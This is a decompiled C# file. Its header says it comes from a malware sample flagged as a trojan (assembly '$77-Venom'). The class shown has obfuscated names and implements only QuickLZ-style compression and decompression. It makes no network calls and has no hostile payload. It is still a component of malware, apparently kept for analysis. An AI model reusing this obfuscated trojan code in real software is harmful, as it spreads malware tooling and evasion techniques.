// Decompiled with JetBrains decompiler
// Type: ᥰ䟫儭뇩飇ﹲ粵⭛螼缥걲᪋歉Ꭿ䅱⇊뾚㺈狲
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;

public static class ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲
{
  public const int ἑ糔\uF02C闸\uE251䟋更㣊ࡋ贡퐄ꃰц鑑\uF0A7\uE26B법\u33A1\uEA58䒨 = 1;
  public const int 㙢蜱\uF626窖\uE475䬗䀨\uE6D6㓺쏎Ȏ\uE736\uFFFDؑઞ\u1AFDⰿ\uFFFDꦤ撔 = 5;
  public const int ⳓ䚊槂몲\u2733ؒ뢷鲋㜥\u0F0A뷜찂芶頾\uF2EB䦬쐲㽴鈢쎞 = 0;
  public const int 岥\uFF5C㹴鬆\uE44B脦헃\u18F7ヂ츠痨乓軋\u24D3\uFFFD皫\uE289뵝栏鄮 = 0;
  public const int \uE5F6븜氿窋੧ᔞ䩠\uE5B4夅屣\uE9C0뷠ᶟ\u0087\uFFFD却ꍅ唳쟔纯 = 0;
  private const int ꨢ坉搽䪕퉱ⷊᄖ쌣ഔ똦\uAB6B\u28A3ꈎᏘ\u0EA8쌾㠤\uEEAA礊麨 = 4096;
  private const int \u2953\u248AᏵ\uFFFD삢\u327E騲\u20BC鱕넞\u17FE\uECE4뜨㜔攗\uE246䕔ቅ녉\uE9C9 = 2;
  private const int ꇹፉ鷟戾ኁ䐧恪ő\uED97빺窯\uE4E3ᐖ鳶뭠醆꼇\u3298ꀑ煱 = 6;
  private const int 羄થꫣ溸䆲ㄋ\uED7E藿઼鏍\uF5DA䜕㿘䖩숨䅯ꍢజ촥\u0B7E = 4;
  private const int 鲀\uF866㶑뒒ξᅘ옵\uA82D\uF4A0껵䄤襓傋껁\u24C2뷎ኧ\uE2B1\uF5BF쁋 = 4;
  private const int \uA6F3ᵹꁊ\uFFFD녭\u2075ᗁ\uA7D5쌧罀\uA700휣筜嬼棬\uED3C穂ﮐ鏽礊 = 9;
  private const int \uEFA3ǂ犱\uF4D1薺䛟Ӊ낑\uE2A7妬㾈ფ佴ꔲ鹅쇗钯鸧䃠\u2AED = 1;
  private const int 獰锩斑भ㛯숒ҹ睔뇒\uEDCA\uE37B凸厇瑌\u2B6F즖蛘轍烘洰 = 16;

  private static int 俗ड़콵䶫\u2E18\u319B\uF3E2\u2740릕窠\uFFFD\uA8FE\u0871\uFFFDƐ㦘\u2A53㘽怒\uE5A0(
    byte[] source)
  {
    return ((int) source[0] & 2) != 2 ? 3 : 9;
  }

  public static int 㞀嗠뭪饵\uE36A꺓\u1AD4\u2FC7刞퍔\uFFFDᯬ㭇阘閙蒵ႚ궭馹贃(byte[] source) => ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.俗ड़콵䶫\u2E18\u319B\uF3E2\u2740릕窠\uFFFD\uA8FE\u0871\uFFFDƐ㦘\u2A53㘽怒\uE5A0(source) == 9 ? (int) source[5] | (int) source[6] << 8 | (int) source[7] << 16 | (int) source[8] << 24 : (int) source[2];

  public static int \uFFFDﲞ禭\uE10Cꔪ陊곧倌鐅ꃃꄆ箑瀱\u24F1\uE968饌荝\uE85C凖\uFFFD(byte[] source) => ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.俗ड़콵䶫\u2E18\u319B\uF3E2\u2740릕窠\uFFFD\uA8FE\u0871\uFFFDƐ㦘\u2A53㘽怒\uE5A0(source) == 9 ? (int) source[1] | (int) source[2] << 8 | (int) source[3] << 16 | (int) source[4] << 24 : (int) source[1];

  private static void 갏酨\uE203࠘ﻬꖷ抉鸀敝恖䡐謎ﾳ罡銭\uF310瑜阝雔\uFFFD(
    byte[] dst,
    int level,
    bool compressible,
    int sizeCompressed,
    int sizeDecompressed)
  {
    dst[0] = (byte) (2 | (compressible ? 1 : 0));
    dst[0] |= (byte) (level << 2);
    dst[0] |= (byte) 64;
    dst[0] |= (byte) 0;
    ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(dst, 1, sizeDecompressed, 4);
    ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(dst, 5, sizeCompressed, 4);
  }

  public static byte[] 生螐ꥐ俍谒\u1AE7\uFFFDﳳ\uF4DFஒ貊䨤\uE80B蟐\uE20C孏팔畫俧射(byte[] source, int level = 3)
  {
    if (source.Length == 0)
      return new byte[0];
    int[,] numArray1;
    if (level != 1)
    {
      if (level != 3)
        throw new ArgumentException("C# version only supports level 1 and 3");
      numArray1 = new int[4096, 16];
    }
    else
      numArray1 = new int[4096, 1];
    int index1 = 0;
    int length = 13;
    uint num1 = 2147483648;
    int i = 9;
    byte[] numArray2 = new byte[source.Length + 400];
    int[] numArray3 = new int[4096];
    byte[] numArray4 = new byte[4096];
    int num2 = 0;
    int num3 = source.Length - 6 - 4 - 1;
    int num4 = 0;
    if (index1 <= num3)
      num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
    while (index1 <= num3)
    {
      if (((int) num1 & 1) == 1)
      {
        if (index1 > source.Length >> 1 && length > index1 - (index1 >> 5))
        {
          byte[] numArray5 = new byte[source.Length + 9];
          ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.갏酨\uE203࠘ﻬꖷ抉鸀敝恖䡐謎ﾳ罡銭\uF310瑜阝雔\uFFFD(numArray5, level, false, source.Length, source.Length + 9);
          Array.Copy((Array) source, 0, (Array) numArray5, 9, source.Length);
          return numArray5;
        }
        ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      if (level == 1)
      {
        int index2 = (num2 >> 12 ^ num2) & 4095;
        int num5 = numArray1[index2, 0];
        int num6 = numArray3[index2] ^ num2;
        numArray3[index2] = num2;
        numArray1[index2, 0] = index1;
        if (num6 == 0 && numArray4[index2] != (byte) 0 && (index1 - num5 > 2 || index1 == num5 + 1 && num4 >= 3 && index1 > 3 && (int) source[index1] == (int) source[index1 - 3] && (int) source[index1] == (int) source[index1 - 2] && (int) source[index1] == (int) source[index1 - 1] && (int) source[index1] == (int) source[index1 + 1] && (int) source[index1] == (int) source[index1 + 2]))
        {
          num1 = num1 >> 1 | 2147483648U;
          if ((int) source[num5 + 3] != (int) source[index1 + 3])
          {
            int num7 = 1 | index2 << 4;
            numArray2[length] = (byte) num7;
            numArray2[length + 1] = (byte) (num7 >> 8);
            index1 += 3;
            length += 2;
          }
          else
          {
            int num8 = index1;
            int num9 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
            index1 += 4;
            if ((int) source[num5 + index1 - num8] == (int) source[index1])
            {
              ++index1;
              if ((int) source[num5 + index1 - num8] == (int) source[index1])
              {
                ++index1;
                while ((int) source[num5 + (index1 - num8)] == (int) source[index1] && index1 - num8 < num9)
                  ++index1;
              }
            }
            int num10 = index1 - num8;
            int num11 = index2 << 4;
            if (num10 < 18)
            {
              int num12 = num11 | num10 - 2;
              numArray2[length] = (byte) num12;
              numArray2[length + 1] = (byte) (num12 >> 8);
              length += 2;
            }
            else
            {
              ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num11 | num10 << 16, 3);
              length += 3;
            }
          }
          num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
          num4 = 0;
        }
        else
        {
          ++num4;
          numArray4[index2] = (byte) 1;
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
          num2 = num2 >> 8 & (int) ushort.MaxValue | (int) source[index1 + 2] << 16;
        }
      }
      else
      {
        num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
        int num13 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
        int index3 = (num2 >> 12 ^ num2) & 4095;
        byte num14 = numArray4[index3];
        int num15 = 0;
        int num16 = 0;
        for (int index4 = 0; index4 < 16 && (int) num14 > index4; ++index4)
        {
          int index5 = numArray1[index3, index4];
          if ((int) (byte) num2 == (int) source[index5] && (int) (byte) (num2 >> 8) == (int) source[index5 + 1] && (int) (byte) (num2 >> 16) == (int) source[index5 + 2] && index5 < index1 - 2)
          {
            int num17 = 3;
            while ((int) source[index5 + num17] == (int) source[index1 + num17] && num17 < num13)
              ++num17;
            if (num17 > num15 || num17 == num15 && index5 > num16)
            {
              num16 = index5;
              num15 = num17;
            }
          }
        }
        int num18 = num16;
        numArray1[index3, (int) num14 & 15] = index1;
        byte num19 = (byte) ((uint) num14 + 1U);
        numArray4[index3] = num19;
        if (num15 >= 3 && index1 - num18 < 131071)
        {
          int num20 = index1 - num18;
          for (int index6 = 1; index6 < num15; ++index6)
          {
            num2 = (int) source[index1 + index6] | (int) source[index1 + index6 + 1] << 8 | (int) source[index1 + index6 + 2] << 16;
            int index7 = (num2 >> 12 ^ num2) & 4095;
            byte num21 = numArray4[index7]++;
            numArray1[index7, (int) num21 & 15] = index1 + index6;
          }
          index1 += num15;
          num1 = num1 >> 1 | 2147483648U;
          if (num15 == 3 && num20 <= 63)
          {
            ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num20 << 2, 1);
            ++length;
          }
          else if (num15 == 3 && num20 <= 16383)
          {
            ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num20 << 2 | 1, 2);
            length += 2;
          }
          else if (num15 <= 18 && num20 <= 1023)
          {
            ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num15 - 3 << 2 | num20 << 6 | 2, 2);
            length += 2;
          }
          else if (num15 <= 33)
          {
            ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num15 - 2 << 2 | num20 << 7 | 3, 3);
            length += 3;
          }
          else
          {
            ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, length, num15 - 3 << 7 | num20 << 15 | 3, 4);
            length += 4;
          }
          num4 = 0;
        }
        else
        {
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
        }
      }
    }
    while (index1 <= source.Length - 1)
    {
      if (((int) num1 & 1) == 1)
      {
        ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      numArray2[length] = source[index1];
      ++index1;
      ++length;
      num1 >>= 1;
    }
    while (((int) num1 & 1) != 1)
      num1 >>= 1;
    ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.\uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
    ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.갏酨\uE203࠘ﻬꖷ抉鸀敝恖䡐謎ﾳ罡銭\uF310瑜阝雔\uFFFD(numArray2, level, true, source.Length, length);
    byte[] destinationArray = new byte[length];
    Array.Copy((Array) numArray2, (Array) destinationArray, length);
    return destinationArray;
  }

  private static void \uF5D4䮲紘\u2F4F笯\u253F\uFFFD吕鄇琑㺝쵾퉅䴅䙳옃זּ셺雘轏(
    byte[] a,
    int i,
    int value,
    int numbytes)
  {
    for (int index = 0; index < numbytes; ++index)
      a[i + index] = (byte) (value >> index * 8);
  }

  public static byte[] 黌줶ウ拟\u33B2䣅鍠\u1977\uEB07盹\uFFFD誥坯\uFFFD\u237C쟄蠀浄䳑\uFFE6(byte[] source)
  {
    if (source.Length == 0)
      return new byte[0];
    int num1 = (int) source[0] >> 2 & 3;
    switch (num1)
    {
      case 1:
      case 3:
        int length = ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.㞀嗠뭪饵\uE36A꺓\u1AD4\u2FC7刞퍔\uFFFDᯬ㭇阘閙蒵ႚ궭馹贃(source);
        int index1 = ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.俗ड़콵䶫\u2E18\u319B\uF3E2\u2740릕窠\uFFFD\uA8FE\u0871\uFFFDƐ㦘\u2A53㘽怒\uE5A0(source);
        int index2 = 0;
        uint num2 = 1;
        byte[] numArray1 = new byte[length];
        int[] numArray2 = new int[4096];
        byte[] numArray3 = new byte[4096];
        int num3 = length - 6 - 4 - 1;
        int index3 = -1;
        uint num4 = 0;
        if (((int) source[0] & 1) != 1)
        {
          byte[] destinationArray = new byte[length];
          Array.Copy((Array) source, ᥰ䟫儭뇩飇ﹲ粵\u2B5B螼缥걲\u1A8B歉\uF525Ꭿ䅱\u21CA뾚㺈狲.俗ड़콵䶫\u2E18\u319B\uF3E2\u2740릕窠\uFFFD\uA8FE\u0871\uFFFDƐ㦘\u2A53㘽怒\uE5A0(source), (Array) destinationArray, 0, length);
          return destinationArray;
        }
        while (true)
        {
          if (num2 == 1U)
          {
            num2 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index1 += 4;
            if (index2 <= num3)
              num4 = num1 != 1 ? (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24) : (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
          }
          if (((int) num2 & 1) == 1)
          {
            num2 >>= 1;
            uint index4;
            uint num5;
            if (num1 == 1)
            {
              int index5 = (int) num4 >> 4 & 4095;
              index4 = (uint) numArray2[index5];
              if (((int) num4 & 15) != 0)
              {
                num5 = (uint) (((int) num4 & 15) + 2);
                index1 += 2;
              }
              else
              {
                num5 = (uint) source[index1 + 2];
                index1 += 3;
              }
            }
            else
            {
              uint num6;
              if (((int) num4 & 3) == 0)
              {
                num6 = (num4 & (uint) byte.MaxValue) >> 2;
                num5 = 3U;
                ++index1;
              }
              else if (((int) num4 & 2) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 2;
                num5 = 3U;
                index1 += 2;
              }
              else if (((int) num4 & 1) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 6;
                num5 = (uint) (((int) (num4 >> 2) & 15) + 3);
                index1 += 2;
              }
              else if (((int) num4 & (int) sbyte.MaxValue) != 3)
              {
                num6 = num4 >> 7 & 131071U;
                num5 = (uint) (((int) (num4 >> 2) & 31) + 2);
                index1 += 3;
              }
              else
              {
                num6 = num4 >> 15;
                num5 = (uint) (((int) (num4 >> 7) & (int) byte.MaxValue) + 3);
                index1 += 4;
              }
              index4 = (uint) ((ulong) index2 - (ulong) num6);
            }
            numArray1[index2] = numArray1[(int) index4];
            numArray1[index2 + 1] = numArray1[(int) index4 + 1];
            numArray1[index2 + 2] = numArray1[(int) index4 + 2];
            for (int index6 = 3; (long) index6 < (long) num5; ++index6)
              numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
            index2 += (int) num5;
            if (num1 == 1)
            {
              uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16);
              while ((long) index3 < (long) index2 - (long) num5)
              {
                ++index3;
                int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095;
                numArray2[index7] = index3;
                numArray3[index7] = (byte) 1;
                num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16));
              }
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
            }
            else
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index3 = index2 - 1;
          }
          else if (index2 <= num3)
          {
            numArray1[index2] = source[index1];
            ++index2;
            ++index1;
            num2 >>= 1;
            if (num1 == 1)
            {
              while (index3 < index2 - 3)
              {
                ++index3;
                int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16;
                int index8 = (num8 >> 12 ^ num8) & 4095;
                numArray2[index8] = index3;
                numArray3[index8] = (byte) 1;
              }
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16));
            }
            else
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16) | (ulong) ((int) source[index1 + 3] << 24));
          }
          else
            break;
        }
        while (index2 <= length - 1)
        {
          if (num2 == 1U)
          {
            index1 += 4;
            num2 = 2147483648U;
          }
          numArray1[index2] = source[index1];
          ++index2;
          ++index1;
          num2 >>= 1;
        }
        return numArray1;
      default:
        throw new ArgumentException("C# version only supports level 1 and 3");
    }
  }
}
